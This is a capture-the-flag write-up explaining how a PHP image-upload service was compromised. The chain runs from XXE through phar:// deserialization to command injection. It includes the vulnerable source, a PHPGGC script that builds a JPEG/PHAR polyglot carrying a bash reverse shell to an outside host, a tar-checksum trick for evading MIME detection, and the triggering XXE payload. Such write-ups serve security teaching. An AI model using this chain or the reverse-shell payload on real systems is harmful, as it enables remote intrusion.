---
tags: ["php", "web", "xxe", "phar"]
author: "bennofs"
---
# Challenge
> Sharing is caring. For picture wizard use only. 

The challenge provides a simple upload service, where you can upload images and they are added to your gallery.

# Solution
The robots.txt hints that the source can be downloaded from http://ruben-01.play.midnightsunctf.se:8080/source.zip.
The important file is `upload.php`:

```php
<?php
session_start();

function calcImageSize($file, $mime_type) {
    if ($mime_type == "image/png"||$mime_type == "image/jpeg") {
        $stats = getimagesize($file);  // Doesn't work for svg...
        $width = $stats[0];
        $height = $stats[1];
    } else {
        $xmlfile = file_get_contents($file);
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $svg = simplexml_import_dom($dom);
        $attrs = $svg->attributes();
        $width = (int) $attrs->width;
        $height = (int) $attrs->height;
    }
    return [$width, $height];
}


class Image {

    function __construct($tmp_name)
    {
        $allowed_formats = [
            "image/png" => "png",
            "image/jpeg" => "jpg",
            "image/svg+xml" => "svg"
        ];
        $this->tmp_name = $tmp_name;
        $this->mime_type = mime_content_type($tmp_name);

        if (!array_key_exists($this->mime_type, $allowed_formats)) {
            // I'd rather 500 with pride than 200 without security
            die("Invalid Image Format!");
        }

        $size = calcImageSize($tmp_name, $this->mime_type);
        if ($size[0] * $size[1] > 1337 * 1337) {
            die("Image too big!");
        }

        $this->extension = "." . $allowed_formats[$this->mime_type];
        $this->file_name = sha1(random_bytes(20));
        $this->folder = $file_path = "images/" . session_id() . "/";
    }

    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
}

new Image($_FILES['image']['tmp_name']);
header('Location: index.php');
```

We see that it supports XML upload, and is vulnerable to XXE injection because it sets the flag `LIBXML_NOENT` (which is badly named: this flag *enables* entity processing). But this alone doesn't help us much since we don't know the name of the flag file and we also cannot observe the output after entities have been processed. 

To gain arbitrary code execution, we make us of the fact that the class `Image` calls `system` during `__destruct`, where some of the parameters passed to `system` are derived from class attributes. Because the XML is parsed by PHP, we can use the `phar://` protocol handler which is known to provide php deserialization (see [1]). Thus we can build a malicious PHAR file (using the tool at [2] to make a PHAR that is also a valid JPEG) which causes an instance of the class `Image` to be created with our command injection payload. We then upload this PHAR to the server and obtain the URL (`images/...`). To trigger the RCE we afterwards upload an xml which uses XXE to load `phar://images/...` thus executing our deserialization payload.

One small difficulty here was in building the polyglot. The problem is that while the PHAR we generate is a valid jpeg, `file` (and `php_mime`) detect it as `tar` because it has higher precedence. We can solve this slightly corrupting the tar file in a way such that `file` no longer detects it but php can still load it. This is possible because PHP parses the checksum differently from file. The char checksum is an 7-digit octal number. If there is any non-octal digit in that number, file will parse the checksum as -1 while PHP returns the checksum it parsed so far. So if we just modify our checksum from "0001234" to "001234x" the file thinks the checksum is invalid while PHP parses the file just fine. A patch that implements this in PHPGGC can be found at [3].

With that patch, we can generate our polyglot PHAR as follows:

```php
<?php
include("./phpggc/lib/PHPGGC.php");

class Image {
};
$object = new Image;
$object->folder="`bash -c 'bash -i >& /dev/tcp/MYDOMAIN.COM/1337 0>&1' >images/h 2>&1`";
$object->file_name="idc";
$object->extension="idc";
$object->tmp_name="idc";

$serialized = serialize($object);
$jpeg="./empty.jpg";
$phar = new \PHPGGC\Phar\Tar($serialized, compact("jpeg"));
file_put_contents('exploit.tar', $phar->generate());
?>
```

Then upload `exploit.tar`, get the URL to it and upload the following XML file:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "phar://images/path_to_exploit_image.jpg/test.txt" >]>
<svg width="100" height="100">
    <user>&xxe;</user>
    <pass>mypass</pass>
</svg>

```

And we get a shell, which we can use to obtain the flag: `midnight{R3lying_0n_PHP_4lw45_W0rKs}`

# References
- [1] https://github.com/s-n-t/presentations/raw/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf
- [2] https://github.com/ambionics/phpggc
- [3] https://github.com/ambionics/phpggc/pull/48



